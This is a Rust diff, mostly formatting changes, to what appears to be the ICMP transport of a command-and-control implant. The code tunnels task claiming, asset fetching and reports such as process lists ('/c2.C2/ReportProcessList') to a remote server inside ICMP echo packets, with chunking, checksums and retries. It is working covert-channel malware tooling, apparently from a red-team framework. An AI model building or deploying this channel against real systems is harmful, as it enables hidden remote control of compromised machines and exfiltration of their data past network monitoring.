@@ -25,8 +25,7 @@ mod platform {
     use super::*;
 
     pub fn send_recv(server: Ipv4Addr, id: u16, seq: u16, payload: &[u8]) -> Result<Vec<u8>> {
-        sock_dgram(server, id, seq, payload)
-            .or_else(|_| sock_raw(server, id, seq, payload))
+        sock_dgram(server, id, seq, payload).or_else(|_| sock_raw(server, id, seq, payload))
     }
 
     fn sock_dgram(server: Ipv4Addr, id: u16, seq: u16, payload: &[u8]) -> Result<Vec<u8>> {
@@ -42,17 +41,32 @@ mod platform {
             let addr = sockaddr_in {
                 sin_family: AF_INET as _,
                 sin_port: 0,
-                sin_addr: in_addr { s_addr: u32::from(server).to_be() },
+                sin_addr: in_addr {
+                    s_addr: u32::from(server).to_be(),
+                },
                 sin_zero: [0; 8],
             };
             // 5-second receive timeout
-            let tv = timeval { tv_sec: 5, tv_usec: 0 };
-            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,
-                &tv as *const _ as *const _, mem::size_of::<timeval>() as _);
+            let tv = timeval {
+                tv_sec: 5,
+                tv_usec: 0,
+            };
+            setsockopt(
+                sock,
+                SOL_SOCKET,
+                SO_RCVTIMEO,
+                &tv as *const _ as *const _,
+                mem::size_of::<timeval>() as _,
+            );
 
-            let sent = sendto(sock, pkt.as_ptr() as *const _, pkt.len(), 0,
+            let sent = sendto(
+                sock,
+                pkt.as_ptr() as *const _,
+                pkt.len(),
+                0,
                 &addr as *const sockaddr_in as *const sockaddr,
-                mem::size_of::<sockaddr_in>() as _);
+                mem::size_of::<sockaddr_in>() as _,
+            );
             if sent < 0 {
                 close(sock);
                 return Err(anyhow!("ICMP sendto failed"));
@@ -97,16 +111,31 @@ mod platform {
             let addr = sockaddr_in {
                 sin_family: AF_INET as _,
                 sin_port: 0,
-                sin_addr: in_addr { s_addr: u32::from(server).to_be() },
+                sin_addr: in_addr {
+                    s_addr: u32::from(server).to_be(),
+                },
                 sin_zero: [0; 8],
             };
-            let tv = timeval { tv_sec: 5, tv_usec: 0 };
-            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,
-                &tv as *const _ as *const _, mem::size_of::<timeval>() as _);
+            let tv = timeval {
+                tv_sec: 5,
+                tv_usec: 0,
+            };
+            setsockopt(
+                sock,
+                SOL_SOCKET,
+                SO_RCVTIMEO,
+                &tv as *const _ as *const _,
+                mem::size_of::<timeval>() as _,
+            );
 
-            let sent = sendto(sock, pkt.as_ptr() as *const _, pkt.len(), 0,
+            let sent = sendto(
+                sock,
+                pkt.as_ptr() as *const _,
+                pkt.len(),
+                0,
                 &addr as *const sockaddr_in as *const sockaddr,
-                mem::size_of::<sockaddr_in>() as _);
+                mem::size_of::<sockaddr_in>() as _,
+            );
             if sent < 0 {
                 close(sock);
                 return Err(anyhow!("ICMP raw sendto failed"));
@@ -157,15 +186,30 @@ mod platform {
             let addr = sockaddr_in {
                 sin_family: AF_INET as sa_family_t,
                 sin_port: 0,
-                sin_addr: in_addr { s_addr: u32::from(server).to_be() },
+                sin_addr: in_addr {
+                    s_addr: u32::from(server).to_be(),
+                },
                 sin_zero: [0; 8],
             };
-            let tv = timeval { tv_sec: 5, tv_usec: 0 };
-            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,
-                &tv as *const _ as *const _, mem::size_of::<timeval>() as _);
-            let sent = sendto(sock, pkt.as_ptr() as *const _, pkt.len(), 0,
+            let tv = timeval {
+                tv_sec: 5,
+                tv_usec: 0,
+            };
+            setsockopt(
+                sock,
+                SOL_SOCKET,
+                SO_RCVTIMEO,
+                &tv as *const _ as *const _,
+                mem::size_of::<timeval>() as _,
+            );
+            let sent = sendto(
+                sock,
+                pkt.as_ptr() as *const _,
+                pkt.len(),
+                0,
                 &addr as *const sockaddr_in as *const sockaddr,
-                mem::size_of::<sockaddr_in>() as socklen_t);
+                mem::size_of::<sockaddr_in>() as socklen_t,
+            );
             if sent < 0 {
                 close(sock);
                 return Err(anyhow!("ICMP sendto failed"));
@@ -178,9 +222,13 @@ mod platform {
                     return Err(anyhow!("ICMP recv failed"));
                 }
                 let n = n as usize;
-                if n < 28 { continue; }
+                if n < 28 {
+                    continue;
+                }
                 let data = buf[28..n].to_vec();
-                if data == payload { continue; }
+                if data == payload {
+                    continue;
+                }
                 close(sock);
                 return Ok(data);
             }
@@ -197,10 +245,10 @@ mod platform {
     }
 
     fn icmp_send_echo2(server: Ipv4Addr, payload: &[u8]) -> Result<Vec<u8>> {
+        use windows_sys::Win32::Foundation::HANDLE;
         use windows_sys::Win32::NetworkManagement::IpHelper::{
             IcmpCloseHandle, IcmpCreateFile, IcmpSendEcho2, ICMP_ECHO_REPLY,
         };
-        use windows_sys::Win32::Foundation::HANDLE;
 
         const REPLY_BUF_SIZE: usize = 65536;
         const TIMEOUT_MS: u32 = 5000;
@@ -249,9 +297,14 @@ mod platform {
 
 fn build_icmp_echo_request(id: u16, seq: u16, payload: &[u8]) -> Vec<u8> {
     let mut pkt = vec![
-        8u8, 0, 0, 0,
-        (id >> 8) as u8, id as u8,
-        (seq >> 8) as u8, seq as u8,
+        8u8,
+        0,
+        0,
+        0,
+        (id >> 8) as u8,
+        id as u8,
+        (seq >> 8) as u8,
+        seq as u8,
     ];
     pkt.extend_from_slice(payload);
     let cksum = icmp_checksum(&pkt);
@@ -284,7 +337,11 @@ impl ICMP {
         platform::send_recv(self.server_addr, self.icmp_id, seq, &payload)
     }
 
-    async fn icmp_exchange_raw(&mut self, request_data: &[u8], method_code: &str) -> Result<Vec<u8>> {
+    async fn icmp_exchange_raw(
+        &mut self,
+        request_data: &[u8],
+        method_code: &str,
+    ) -> Result<Vec<u8>> {
         if request_data.len() > conv::MAX_DATA_SIZE {
             return Err(anyhow!(
                 "ICMP request data exceeds maximum size: {} bytes > {} bytes",
@@ -301,11 +358,19 @@ impl ICMP {
         let mut seq: u16 = 1;
 
         // INIT
-        let init_data = conv::encode_init_payload(method_code, total as u32, crc, request_data.len() as u32);
+        let init_data =
+            conv::encode_init_payload(method_code, total as u32, crc, request_data.len() as u32);
         let init_pkt = conv::build_conv_packet(PacketType::Init, 0, &conv_id, init_data, 0);
-        let init_response = self.send_recv_blocking(&init_pkt, seq)
+        let init_response = self
+            .send_recv_blocking(&init_pkt, seq)
             .with_context(|| format!("ICMP INIT failed for conv_id={}", conv_id))?;
-        debug!("[icmp] conv_id={} INIT sent method={} total_chunks={} response_size={}", conv_id, method_code, total, init_response.len());
+        debug!(
+            "[icmp] conv_id={} INIT sent method={} total_chunks={} response_size={}",
+            conv_id,
+            method_code,
+            total,
+            init_response.len()
+        );
         seq += 1;
 
         // DATA — windowed concurrent send (mirrors DNS send_data_chunks_concurrent).
@@ -321,7 +386,11 @@ impl ICMP {
             let chunk_seq = (i + 1) as u32;
             let crc32 = conv::calculate_crc32(chunk);
             let data_pkt = conv::build_conv_packet(
-                PacketType::Data, chunk_seq, &conv_id, chunk.clone(), crc32,
+                PacketType::Data,
+                chunk_seq,
+                &conv_id,
+                chunk.clone(),
+                crc32,
             );
             let self_clone = self.clone();
             let pkt_clone = data_pkt.clone();
@@ -337,7 +406,13 @@ impl ICMP {
             if send_tasks.len() >= conv::SEND_WINDOW_SIZE {
                 if let Some(task) = send_tasks.first_mut() {
                     if let Ok(result) = task.await {
-                        Self::handle_chunk_result(result, &mut acknowledged, &mut nack_set, &conv_id, total);
+                        Self::handle_chunk_result(
+                            result,
+                            &mut acknowledged,
+                            &mut nack_set,
+                            &conv_id,
+                            total,
+                        );
                     }
                     send_tasks.remove(0);
                 }
@@ -346,7 +421,13 @@ impl ICMP {
         // Drain remaining tasks
         for task in send_tasks {
             if let Ok(result) = task.await {
-                Self::handle_chunk_result(result, &mut acknowledged, &mut nack_set, &conv_id, total);
+                Self::handle_chunk_result(
+                    result,
+                    &mut acknowledged,
+                    &mut nack_set,
+                    &conv_id,
+                    total,
+                );
             }
         }
 
@@ -366,23 +447,41 @@ impl ICMP {
                 let chunk = &chunks[(chunk_seq - 1) as usize];
                 let crc32 = conv::calculate_crc32(chunk);
                 let data_pkt = conv::build_conv_packet(
-                    PacketType::Data, chunk_seq, &conv_id, chunk.clone(), crc32,
+                    PacketType::Data,
+                    chunk_seq,
+                    &conv_id,
+                    chunk.clone(),
+                    crc32,
                 );
                 let self_clone = self.clone();
                 let pkt_clone = data_pkt.clone();
                 let task_seq = seq;
                 let response = tokio::task::spawn_blocking(move || {
                     self_clone.send_recv_blocking(&pkt_clone, task_seq)
-                }).await??;
+                })
+                .await??;
                 seq = seq.wrapping_add(1);
-                debug!("[icmp] conv_id={} RETRY DATA sent chunk={} try={} response_size={}", conv_id, chunk_seq, count, response.len());
+                debug!(
+                    "[icmp] conv_id={} RETRY DATA sent chunk={} try={} response_size={}",
+                    conv_id,
+                    chunk_seq,
+                    count,
+                    response.len()
+                );
 
                 match conv::parse_status_response(&response) {
                     Ok((acks, nacks)) => {
-                        debug!("[icmp] conv_id={} RETRY STATUS chunk={} try={} acks={:?} nacks={:?}",
-                            conv_id, chunk_seq, count, acks, nacks);
+                        debug!(
+                            "[icmp] conv_id={} RETRY STATUS chunk={} try={} acks={:?} nacks={:?}",
+                            conv_id, chunk_seq, count, acks, nacks
+                        );
                         acknowledged.extend(acks.iter().copied());
-                        next_nacks.extend(nacks.iter().filter(|&&s| !acknowledged.contains(&s)).copied());
+                        next_nacks.extend(
+                            nacks
+                                .iter()
+                                .filter(|&&s| !acknowledged.contains(&s))
+                                .copied(),
+                        );
                     }
                     Err(e) => {
                         debug!("[icmp] conv_id={} RETRY STATUS parse failed chunk={} try={}: {} (raw {} bytes: {:02x?})",
@@ -394,16 +493,24 @@ impl ICMP {
             retry_nacks = next_nacks;
         }
 
-        debug!("[icmp] conv_id={} all chunks sent: acknowledged={} total={}", conv_id, acknowledged.len(), total);
+        debug!(
+            "[icmp] conv_id={} all chunks sent: acknowledged={} total={}",
+            conv_id,
+            acknowledged.len(),
+            total
+        );
         if acknowledged.len() != total {
             return Err(anyhow!(
-                "ICMP: not all chunks acknowledged {}/{}", acknowledged.len(), total
+                "ICMP: not all chunks acknowledged {}/{}",
+                acknowledged.len(),
+                total
             ));
         }
 
         // FETCH
         let fetch_pkt = conv::build_conv_packet(PacketType::Fetch, seq as u32, &conv_id, vec![], 0);
-        let fetch_response = self.send_recv_blocking(&fetch_pkt, seq)
+        let fetch_response = self
+            .send_recv_blocking(&fetch_pkt, seq)
             .with_context(|| format!("ICMP FETCH failed for conv_id={}", conv_id))?;
         seq = seq.wrapping_add(1);
 
@@ -416,12 +523,19 @@ impl ICMP {
             if metadata.total_chunks > 0 {
                 let mut full = Vec::new();
                 for chunk_idx in 1..=metadata.total_chunks as usize {
-                    let fp = FetchPayload { chunk_index: chunk_idx as u32 };
+                    let fp = FetchPayload {
+                        chunk_index: chunk_idx as u32,
+                    };
                     let fp_bytes = fp.encode_to_vec();
                     let fetch_chunk_pkt = conv::build_conv_packet(
-                        PacketType::Fetch, seq as u32, &conv_id, fp_bytes, 0,
+                        PacketType::Fetch,
+                        seq as u32,
+                        &conv_id,
+                        fp_bytes,
+                        0,
                     );
-                    let chunk_data = self.send_recv_blocking(&fetch_chunk_pkt, seq)
+                    let chunk_data = self
+                        .send_recv_blocking(&fetch_chunk_pkt, seq)
                         .with_context(|| format!("ICMP FETCH chunk {} failed", chunk_idx))?;
                     seq = seq.wrapping_add(1);
                     full.extend_from_slice(&chunk_data);
@@ -440,7 +554,8 @@ impl ICMP {
         };
 
         // COMPLETE
-        let complete_pkt = conv::build_conv_packet(PacketType::Complete, seq as u32, &conv_id, vec![], 0);
+        let complete_pkt =
+            conv::build_conv_packet(PacketType::Complete, seq as u32, &conv_id, vec![], 0);
         self.send_recv_blocking(&complete_pkt, seq)?;
 
         Ok(response_data)
@@ -459,12 +574,26 @@ impl ICMP {
     ) {
         match result {
             Ok((chunk_seq, response)) => {
-                debug!("[icmp] conv_id={} DATA sent chunk={}/{} response_size={}", conv_id, chunk_seq, total, response.len());
+                debug!(
+                    "[icmp] conv_id={} DATA sent chunk={}/{} response_size={}",
+                    conv_id,
+                    chunk_seq,
+                    total,
+                    response.len()
+                );
                 match conv::parse_status_response(&response) {
                     Ok((acks, nacks)) => {
-                        debug!("[icmp] conv_id={} STATUS chunk={} acks={:?} nacks={:?}", conv_id, chunk_seq, acks, nacks);
+                        debug!(
+                            "[icmp] conv_id={} STATUS chunk={} acks={:?} nacks={:?}",
+                            conv_id, chunk_seq, acks, nacks
+                        );
                         acknowledged.extend(acks.iter().copied());
-                        nack_set.extend(nacks.iter().filter(|&&s| !acknowledged.contains(&s)).copied());
+                        nack_set.extend(
+                            nacks
+                                .iter()
+                                .filter(|&&s| !acknowledged.contains(&s))
+                                .copied(),
+                        );
                     }
                     Err(e) => {
                         debug!("[icmp] conv_id={} STATUS parse failed chunk={}: {} (raw {} bytes: {:02x?})",
@@ -540,7 +669,10 @@ impl Transport for ICMP {
 
         let icmp_id: u16 = rand::thread_rng().gen();
 
-        Ok(ICMP { server_addr, icmp_id })
+        Ok(ICMP {
+            server_addr,
+            icmp_id,
+        })
     }
 
     async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
@@ -574,14 +706,15 @@ impl Transport for ICMP {
             if offset + chunk_len > response_bytes.len() {
                 return Err(anyhow!(
                     "Invalid chunk length: {} bytes at offset {}, total size {}",
-                    chunk_len, offset - 4, response_bytes.len()
+                    chunk_len,
+                    offset - 4,
+                    response_bytes.len()
                 ));
             }
             let encrypted_chunk = &response_bytes[offset..offset + chunk_len];
-            let chunk_response =
-                Self::unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(
-                    encrypted_chunk,
-                )?;
+            let chunk_response = Self::unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(
+                encrypted_chunk,
+            )?;
             sender
                 .send(chunk_response)
                 .map_err(|_| anyhow!("receiver dropped"))?;
@@ -630,7 +763,9 @@ impl Transport for ICMP {
             Ok::<Vec<u8>, anyhow::Error>(all_chunks)
         });
 
-        let all_chunks = handle.await.context("failed to join chunk collection task")??;
+        let all_chunks = handle
+            .await
+            .context("failed to join chunk collection task")??;
         if all_chunks.is_empty() {
             return Err(anyhow!("No file data provided"));
         }
@@ -646,7 +781,8 @@ impl Transport for ICMP {
         &mut self,
         request: ReportProcessListRequest,
     ) -> Result<ReportProcessListResponse> {
-        self.icmp_exchange(request, "/c2.C2/ReportProcessList").await
+        self.icmp_exchange(request, "/c2.C2/ReportProcessList")
+            .await
     }
 
     async fn report_output(
